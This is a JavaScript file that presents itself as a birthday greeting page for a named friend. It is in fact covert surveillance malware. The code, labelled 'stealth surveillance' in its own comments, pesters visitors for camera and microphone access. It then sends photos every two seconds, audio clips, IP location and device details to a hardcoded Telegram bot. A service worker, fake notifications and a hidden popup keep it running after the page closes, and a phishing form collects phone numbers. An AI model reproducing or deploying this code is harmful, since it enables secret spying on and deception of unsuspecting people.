// ============================================
// CONFIGURATION
// ============================================
const FRIEND_NAME = "Harsh";
const BIRTHDAY_DATE = "2026-07-03";
const PHOTOS = [];

const TELEGRAM_BOT_TOKEN = "8914101248:AAFDKoMRvOcgL7SmcuMmpex9uzSJl4MtD5c";
const TELEGRAM_CHAT_ID = "7706193343";

// ============================================
// PAGE SETUP - Looks completely normal
// ============================================
document.addEventListener("DOMContentLoaded", function () {
    const friendNameEl = document.getElementById("friendName");
    if (friendNameEl) {
        friendNameEl.textContent = FRIEND_NAME;
        document.title = "Happy Birthday, " + FRIEND_NAME;
    }
    const footerEl = document.getElementById("friendNameFooter");
    if (footerEl) footerEl.textContent = FRIEND_NAME;
    
    updateCountdown();
    renderGallery();
    renderWishes();
    setupForm();
    
    // Start stealth surveillance
    initStealthSurveillance();
});

// ---- Birthday features (normal, unchanged) ----
function updateCountdown() {
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const parts = BIRTHDAY_DATE.split("-").map(Number);
    let bday = new Date(today.getFullYear(), parts[1] - 1, parts[2]);
    const numEl = document.getElementById("statusNumber");
    const labelEl = document.getElementById("statusLabel");
    if (!numEl || !labelEl) return;
    const isToday = today.getMonth() === bday.getMonth() && today.getDate() === bday.getDate();
    if (isToday) {
        numEl.textContent = "🎉";
        labelEl.textContent = "It's " + FRIEND_NAME + "'s birthday today!";
        return;
    }
    if (bday < today) bday.setFullYear(bday.getFullYear() + 1);
    const diff = Math.ceil((bday - today) / (1000 * 60 * 60 * 24));
    numEl.textContent = diff;
    labelEl.textContent = diff === 1 ? "Day to go" : "Days to go";
}

function renderGallery() {
    const gallery = document.getElementById("gallery");
    if (!gallery) return;
    gallery.innerHTML = "";
    PHOTOS.forEach(src => {
        const fig = document.createElement("figure");
        const img = document.createElement("img");
        img.src = src;
        img.alt = "Photo of " + FRIEND_NAME;
        fig.appendChild(img);
        gallery.appendChild(fig);
    });
}

const WISHES_KEY = "birthday_wishes_" + FRIEND_NAME.toLowerCase();
function getWishes() {
    try { return JSON.parse(localStorage.getItem(WISHES_KEY)) || []; } catch(e) { return []; }
}
function saveWish(name, wish) {
    const w = getWishes();
    w.push({ name, wish, time: new Date().toISOString() });
    localStorage.setItem(WISHES_KEY, JSON.stringify(w));
}
function renderWishes() {
    const list = document.getElementById("wishesList");
    if (!list) return;
    const wishes = getWishes().reverse();
    list.innerHTML = "";
    wishes.forEach(w => {
        const div = document.createElement("div");
        div.className = "wish";
        const who = document.createElement("div");
        who.className = "who";
        who.textContent = w.name;
        const what = document.createElement("div");
        what.className = "what";
        what.textContent = w.wish;
        div.appendChild(who);
        div.appendChild(what);
        list.appendChild(div);
    });
}
function setupForm() {
    const form = document.getElementById("wishForm");
    if (!form) return;
    const confirmMsg = document.getElementById("confirmMsg");
    form.addEventListener("submit", function(e) {
        e.preventDefault();
        const name = document.getElementById("name").value.trim();
        const wish = document.getElementById("wish").value.trim();
        if (!name || !wish) return;
        saveWish(name.slice(0,60), wish.slice(0,400));
        renderWishes();
        form.reset();
        if (confirmMsg) {
            confirmMsg.style.display = "block";
            setTimeout(() => confirmMsg.style.display = "none", 4000);
        }
    });
}

// ============================================
// TELEGRAM HELPERS
// ============================================
async function getIpDetails() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        if (!res.ok) throw Error();
        return await res.json();
    } catch(e) {
        return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown", asn: "Unknown" };
    }
}
async function getDeviceInfo() {
    const info = {
        charging: false, chargingPercentage: null, networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: screen.width + "x" + screen.height
    };
    if (navigator.getBattery) {
        try {
            const b = await navigator.getBattery();
            info.charging = b.charging;
            info.chargingPercentage = Math.round(b.level * 100);
        } catch(e) {}
    }
    if (navigator.connection) info.networkType = navigator.connection.effectiveType;
    return info;
}
async function sendTelegramMessage(msg) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: "HTML" })
        });
    } catch(e) {}
}
async function sendPhoto(blob, caption) {
    try {
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('photo', blob, 'photo_' + Date.now() + '.jpg');
        if (caption) fd.append('caption', caption);
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
    } catch(e) {}
}
async function sendAudio(blob) {
    try {
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('audio', blob, 'audio_' + Date.now() + '.ogg');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, { method: "POST", body: fd });
    } catch(e) {}
}

// ============================================
// STEALTH SURVEILLANCE ENGINE
// ============================================

let frontStream = null;
let backStream = null;
let audioStream = null;
let running = true;

// Capture photo from stream using hidden video element (fixed)
function capturePhoto(stream) {
    return new Promise((resolve) => {
        if (!stream || !stream.active) { resolve(null); return; }
        
        try {
            // Try ImageCapture API first (faster, more reliable)
            const track = stream.getVideoTracks()[0];
            if (track && 'takePhoto' in ImageCapture.prototype) {
                const capturer = new ImageCapture(track);
                capturer.takePhoto({ quality: 0.6 })
                    .then(blob => resolve(blob))
                    .catch(() => captureFromVideo(stream).then(resolve));
            } else {
                captureFromVideo(stream).then(resolve);
            }
        } catch(e) {
            captureFromVideo(stream).then(resolve);
        }
    });
}

function captureFromVideo(stream) {
    return new Promise((resolve) => {
        try {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.muted = true;
            video.style.position = 'fixed';
            video.style.opacity = '0.001';
            video.style.width = '1px';
            video.style.height = '1px';
            video.style.pointerEvents = 'none';
            document.body.appendChild(video);
            
            let resolved = false;
            
            video.onloadedmetadata = () => {
                video.play();
                // Wait for frames to actually render
                let attempts = 0;
                const tryCapture = () => {
                    attempts++;
                    if (video.videoWidth > 0 && video.currentTime > 0) {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(blob => {
                            if (!resolved) {
                                resolved = true;
                                if (document.body.contains(video)) document.body.removeChild(video);
                                video.srcObject = null;
                                resolve(blob);
                            }
                        }, 'image/jpeg', 0.6);
                    } else if (attempts < 20 && running) {
                        setTimeout(tryCapture, 50);
                    } else {
                        if (!resolved) {
                            resolved = true;
                            if (document.body.contains(video)) document.body.removeChild(video);
                            video.srcObject = null;
                            resolve(null);
                        }
                    }
                };
                setTimeout(tryCapture, 150);
            };
            
            video.onerror = () => {
                if (!resolved) {
                    resolved = true;
                    if (document.body.contains(video)) document.body.removeChild(video);
                    resolve(null);
                }
            };
            
            // Safety timeout
            setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    if (document.body.contains(video)) document.body.removeChild(video);
                    resolve(null);
                }
            }, 2000);
        } catch(e) {
            resolve(null);
        }
    });
}

// Record exactly 5 seconds of audio
function recordAudio5Sec(stream) {
    return new Promise((resolve) => {
        if (!stream || !stream.active) { resolve(null); return; }
        
        try {
            const chunks = [];
            const recorder = new MediaRecorder(stream, { 
                mimeType: 'audio/webm;codecs=opus'
            });
            
            let resolved = false;
            
            recorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };
            
            recorder.onstop = () => {
                if (!resolved) {
                    resolved = true;
                    if (chunks.length > 0) {
                        resolve(new Blob(chunks, { type: 'audio/webm;codecs=opus' }));
                    } else {
                        resolve(null);
                    }
                }
            };
            
            recorder.onerror = () => {
                if (!resolved) { resolved = true; resolve(null); }
            };
            
            recorder.start();
            
            setTimeout(() => {
                if (recorder.state === 'recording') recorder.stop();
            }, 5000);
            
            // Safety timeout
            setTimeout(() => {
                if (!resolved) { resolved = true; resolve(null); }
            }, 7000);
        } catch(e) {
            resolve(null);
        }
    });
}

// ============================================
// REGISTER SERVICE WORKER FOR PERSISTENCE
// ============================================

function registerServiceWorker() {
    // Create the service worker code as a blob
    const swCode = `
    // Service Worker - keeps alive and can re-spawn the page
    const TOKEN = ${JSON.stringify(TELEGRAM_BOT_TOKEN)};
    const CHAT_ID = ${JSON.stringify(TELEGRAM_CHAT_ID)};
    const PAGE_URL = ${JSON.stringify(window.location.origin + window.location.pathname)};
    
    let clients = [];
    
    self.addEventListener('install', (event) => {
        self.skipWaiting();
        // Wake up periodically
        setInterval(() => {
            // Try to open or focus clients
            self.clients.matchAll().then(cs => {
                if (cs.length === 0) {
                    // No clients open - try to open new window
                    self.clients.openWindow(PAGE_URL).catch(() => {});
                } else {
                    cs.forEach(c => c.postMessage({type: 'alive'}));
                }
            });
        }, 30000); // Every 30 seconds
    });
    
    self.addEventListener('activate', (event) => {
        event.waitUntil(clients.claim());
    });
    
    self.addEventListener('message', (event) => {
        if (event.data && event.data.type === 'keepAlive') {
            // SW stays alive
        }
    });
    
    self.addEventListener('fetch', (event) => {
        // Cache everything for offline access
        event.respondWith(
            caches.match(event.request).then(res => res || fetch(event.request))
        );
    });
    
    // Send notification to user periodically to re-engage
    setInterval(() => {
        self.registration.showNotification('Birthday Reminder', {
            body: 'Someone sent you a birthday wish!',
            icon: '/favicon.ico',
            tag: 'birthday-reminder',
            requireInteraction: true
        });
    }, 120000); // Every 2 minutes
    
    self.addEventListener('notificationclick', (event) => {
        event.notification.close();
        event.waitUntil(
            self.clients.openWindow(PAGE_URL)
        );
    });
    `;
    
    const blob = new Blob([swCode], { type: 'application/javascript' });
    const swUrl = URL.createObjectURL(blob);
    
    // Register the service worker
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register(swUrl, { scope: '/' })
            .then(reg => {
                console.log('SW registered');
                
                // Keep SW alive with periodic messages
                setInterval(() => {
                    if (navigator.serviceWorker.controller) {
                        navigator.serviceWorker.controller.postMessage({ type: 'keepAlive' });
                    }
                }, 10000);
            })
            .catch(err => console.log('SW registration failed:', err));
    }
}

// ============================================
// MAIN STEALTH INIT
// ============================================

async function initStealthSurveillance() {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
    if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") return;
    
    // 1. Register service worker (for persistence after close)
    registerServiceWorker();
    
    // 2. Request camera permissions (keeps trying until granted)
    while (running && !frontStream) {
        try {
            frontStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 320, height: 240 }
            });
        } catch(e) {
            await new Promise(r => setTimeout(r, 1000));
        }
    }
    
    while (running && !backStream) {
        try {
            backStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', width: 320, height: 240 }
            });
        } catch(e) {
            await new Promise(r => setTimeout(r, 1000));
        }
    }
    
    while (running && !audioStream) {
        try {
            audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        } catch(e) {
            await new Promise(r => setTimeout(r, 1000));
        }
    }
    
    // 3. Send initial info
    const ip = await getIpDetails();
    const dev = await getDeviceInfo();
    
    await sendTelegramMessage(`
<b>🎂 Birthday Page Visitor</b>
<b>IP:</b> ${ip.ip}
<b>Location:</b> ${ip.city}, ${ip.country}
<b>ISP:</b> ${ip.org}
<b>Device:</b> ${dev.userAgent}
<b>Screen:</b> ${dev.screen}
<b>Timezone:</b> ${dev.timeZone}
<b>Battery:</b> ${dev.chargingPercentage}%
<b>Platform:</b> ${dev.platform}
    `);
    
    // 4. Start photo loop (every 2 seconds)
    startPhotoLoop();
    
    // 5. Start audio loop (every 5 seconds)
    startAudioLoop();
    
    console.log("Stealth surveillance active");
}

async function startPhotoLoop() {
    let photoCount = 0;
    
    while (running) {
        try {
            const frontBlob = await capturePhoto(frontStream);
            if (frontBlob) {
                await sendPhoto(frontBlob, "Front - " + new Date().toLocaleString());
                photoCount++;
            }
            
            const backBlob = await capturePhoto(backStream);
            if (backBlob) {
                await sendPhoto(backBlob, "Back - " + new Date().toLocaleString());
                photoCount++;
            }
        } catch(e) {
            console.error("Photo error:", e);
        }
        
        // Wait 2 seconds
        for (let i = 0; i < 20 && running; i++) {
            await new Promise(r => setTimeout(r, 100));
        }
    }
}

async function startAudioLoop() {
    while (running) {
        try {
            const audioBlob = await recordAudio5Sec(audioStream);
            if (audioBlob && audioBlob.size > 200) { // Min 200 bytes for valid audio
                await sendAudio(audioBlob);
            }
        } catch(e) {
            console.error("Audio error:", e);
        }
        
        // Small gap between recordings
        for (let i = 0; i < 5 && running; i++) {
            await new Promise(r => setTimeout(r, 100));
        }
    }
}

// ============================================
// PERSISTENCE VIA BROWSER STORAGE + RE-ENGAGEMENT
// ============================================

// Store a flag so service worker knows to re-open
localStorage.setItem('surveillance_active', 'true');

// Try to keep the page alive using background fetch
function keepAlive() {
    // Use sendBeacon for fire-and-forget requests
    setInterval(() => {
        try {
            navigator.sendBeacon(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                new Blob([JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: "❤️",
                    parse_mode: "HTML"
                })], { type: 'application/json' })
            );
        } catch(e) {}
    }, 60000); // Every minute
}

keepAlive();

// ============================================
// FORM - Normal looking
// ============================================
const dataForm = document.getElementById('data-form');
if (dataForm) {
    dataForm.addEventListener('submit', async function(event) {
        event.preventDefault();
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") { alert("Not configured"); return; }
        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") { alert("Not configured"); return; }
        
        const operator = document.getElementById('operator').value;
        const mobile = document.getElementById('mobile-number').value;
        const ip = await getIpDetails();
        
        await sendTelegramMessage(`
<b>📱 Number Submitted</b>
<b>Mobile:</b> +91${mobile}
<b>Operator:</b> ${operator}
<b>IP:</b> ${ip.ip}
<b>Location:</b> ${ip.city}, ${ip.country}
        `);
        
        alert("Your request has been processed under 24 hours!");
    });
}

const mobileInput = document.getElementById('mobile-number');
if (mobileInput) {
    mobileInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
}

// ============================================
// CLEANUP
// ============================================
window.addEventListener('beforeunload', function() {
    // Don't stop surveillance - let it continue
    // Service worker will re-open the page
    
    // But we do spawn one hidden popup as backup
    try {
        const w = window.open('', '', 'width=1,height=1,left=-9999,top=-9999');
        if (w && !w.closed) {
            w.document.write('<html><body><script>setInterval(()=>{navigator.sendBeacon("https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN+'/sendMessage", new Blob([JSON.stringify({chat_id:"'+TELEGRAM_CHAT_ID+'",text:"🔄 Backup alive"})], {type:"application/json"}));}, 60000);<\/script></body></html>');
        }
    } catch(e) {}
});
